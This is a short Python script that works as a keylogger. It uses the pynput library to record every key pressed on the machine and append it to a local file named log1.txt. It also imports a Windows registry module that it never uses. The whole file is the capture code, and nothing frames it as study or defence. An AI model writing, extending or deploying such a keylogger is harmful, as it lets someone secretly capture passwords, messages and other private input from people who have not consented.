from winreg import HKEY_LOCAL_MACHINE
from pynput.keyboard import Listener


def rahul_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == "Key.space":
        letter = " "
    if letter == "Key.shift_r":
        letter = ""
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log1.txt",'a') as f:
        f.write(letter)


with Listener(on_press=rahul_file) as l:
    l.join()